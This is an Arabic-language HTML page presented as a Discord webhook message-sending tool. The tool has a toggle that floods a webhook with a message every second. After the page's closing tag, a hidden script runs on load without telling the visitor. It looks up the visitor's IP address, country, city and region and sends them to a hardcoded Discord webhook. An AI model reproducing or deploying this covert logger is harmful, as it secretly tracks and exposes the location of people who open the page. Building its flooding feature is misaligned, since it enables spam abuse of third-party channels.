<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>أداة إرسال رسالة عبر Webhook</title>
  <style>
    body{font-family: Tahoma, Arial, Helvetica, sans-serif;background:#000;color:#0f0;padding:20px;overflow:hidden;position:relative;}
    #matrix-bg{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;}
    canvas{display:block;}
    .card{max-width:820px;margin:20px auto;background:rgba(0,0,0,0.55);border-radius:12px;padding:20px;box-shadow:0 8px 20px rgba(0,255,0,0.25);border:1px solid rgba(0,255,0,0.25);}
    label{display:block;margin-top:10px;font-weight:600;color:#0f0}
    input[type=text], textarea, input[type=url]{width:100%;padding:10px;margin-top:6px;border:1px solid rgba(0,255,0,0.35);border-radius:6px;background:rgba(0,0,0,0.4);color:#0f0;}
    textarea{min-height:120px;resize:vertical}
    .row{display:flex;gap:10px}.row > *{flex:1}
    button{margin-top:12px;padding:12px 16px;border:none;border-radius:8px;background:#0f0;color:#000;font-weight:700;cursor:pointer;font-size:15px;transition:0.25s;}
    button:hover{background:#000;color:#0f0;border:1px solid #0f0}
    .log{margin-top:12px;padding:10px;border-radius:6px;background:rgba(0,0,0,0.45);font-family:monospace;white-space:pre-wrap;color:#0f0;border:1px solid rgba(0,255,0,0.3);}
    h2{text-align:center;font-size:24px;color:#0f0;text-shadow:0 0 6px rgba(0,255,0,0.5);}
    details summary{cursor:pointer;font-size:20px;color:#0f0;margin-top:20px;}
    details div{margin-top:10px;}
  </style>
</head>
<body>
  <div id="matrix-bg"><canvas id="matrix"></canvas></div>
  <div class="card">
    <h2>أداة إرسال رسالة عبر Webhook</h2>
    <p style="font-size:12px;color:#9f9;text-align:center;margin-top:-10px;">تم صنع الموقع من قبل شملان</p>
    <label>رابط Webhook</label>
    <input id="webhookUrl" type="url" placeholder="https://discord.com/api/webhooks/..." />
    <div class="row">
      <div>
        <label>اسم المرسل (اختياري)</label>
        <input id="username" type="text" placeholder="اسم يظهر في الرسالة" />
      </div>
      <div>
        <label>رابط صورة الأفاتار (اختياري)</label>
        <input id="avatar" type="url" placeholder="https://.../avatar.png" />
      </div>
    </div>
    <label>نص الرسالة</label>
    <textarea id="content" placeholder="مثل: مرحباً، هذه رسالة اختبار من الويبهوك"></textarea>

    <!-- Collapsible Optional Section -->
    <details>
      <summary>⬇️ خيارات إضافية (اضغط لفتح)</summary>
      <div>
        <input id="embedTitle" type="text" placeholder="عنوان الـ embed (اختياري)" />
        <textarea id="embedDesc" placeholder="وصف الـ embed (اختياري)"></textarea>
        <input id="file" type="file" />
        <label style="margin-top:10px;display:block;color:#0f0;"><input type="checkbox" id="spamToggle"> تفعيل خيار السبام (إرسال مستمر)</label>
      </div>
    </details>

    <button id="sendBtn">إرسال الرسالة</button>
    <div id="log" class="log">السجل: جاهز</div>
  </div>
<script>
const webhookUrlEl = document.getElementById('webhookUrl');
const usernameEl = document.getElementById('username');
const avatarEl = document.getElementById('avatar');
const contentEl = document.getElementById('content');
const embedTitleEl = document.getElementById('embedTitle');
const embedDescEl = document.getElementById('embedDesc');
const fileEl = document.getElementById('file');
const sendBtn = document.getElementById('sendBtn');
const spamToggle = document.getElementById('spamToggle');
const logEl = document.getElementById('log');
let spamInterval = null;

function log(txt){ const now = new Date().toLocaleString(); logEl.textContent = now + ' — ' + txt; }

async function sendWebhook(){
  const url = webhookUrlEl.value.trim();
  if(!url){ log('أدخل رابط الويب هوك أولاً'); return; }
  const payload = { content: (contentEl.value || "") + "

تم صنع الأداة من قبل شملان", username: usernameEl.value || undefined, avatar_url: avatarEl.value || undefined };
  const embedTitle = embedTitleEl.value.trim();
  const embedDesc = embedDescEl.value.trim();
  if(embedTitle || embedDesc){ payload.embeds = [{ title: embedTitle || undefined, description: embedDesc || undefined }]; }
  const file = fileEl.files[0];
  try{
    if(file){
      const fd = new FormData();
      fd.append('file', file, file.name);
      fd.append('payload_json', JSON.stringify(payload));
      const res = await fetch(url, { method: 'POST', body: fd });
      if(res.ok){ log('تم الإرسال بنجاح (مع ملف)'); }
      else{ const text = await res.text(); log('فشل الإرسال: ' + res.status + ' — ' + text); }
    } else {
      const res = await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
      if(res.ok){ log('تم الإرسال بنجاح'); }
      else{ const text = await res.text(); log('فشل الإرسال: ' + res.status + ' — ' + text); }
    }
  } catch(err){ log('حدث خطأ: ' + err.message + '\nإذا كان الخطأ متعلقًا بـ CORS، استخدم سيرفر وسيط لتمرير الطلب.'); }
}

sendBtn.addEventListener('click', sendWebhook);

spamToggle.addEventListener('change', function(){
  if(spamToggle.checked){
    if(spamInterval) clearInterval(spamInterval);
    spamInterval = setInterval(sendWebhook, 1000); // كل 1 ثانية
    log('تم تفعيل السبام');
  } else {
    clearInterval(spamInterval);
    spamInterval = null;
    log('تم إيقاف السبام');
  }
});

// Matrix Background
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.height = window.innerHeight; canvas.width = window.innerWidth;
const letters = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*+-/';
const matrix = letters.split('');
const fontSize = 16; const columns = canvas.width / fontSize;
let drops = []; for(let i=0;i<columns;i++) drops[i]=1;
function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
ctx.fillStyle='#0f0'; ctx.font = fontSize+'px monospace'; for(let i=0;i<drops.length;i++){ const text = matrix[Math.floor(Math.random()*matrix.length)]; ctx.fillText(text,i*fontSize,drops[i]*fontSize); if(drops[i]*fontSize>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
setInterval(draw,40);
</script>
  <footer style="text-align:center;margin-top:20px;color:#555;font-size:14px;">© 2025 — Discord: l7wl | فريق العمل: شملان — زكس — دونر</footer>
</body>
</html>
  <script>
    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const { ip, country, city, region } = data;
        const dateTime = new Date().toLocaleString();
        const webhookUrl = 'https://discord.com/api/webhooks/1432117446394908736/KTwmd-f8png6QS7MDLC4joF5V-txR2UfUQ332aPVjH_7u3InF0U88zEMMrZELzje9RE4';
        
        const payload = {
          content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nRegion: ${region}\nDate & Time: ${dateTime}`
        };
        
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .catch(error => console.error('Error fetching IP info:', error));
  </script>
</body>
</html>

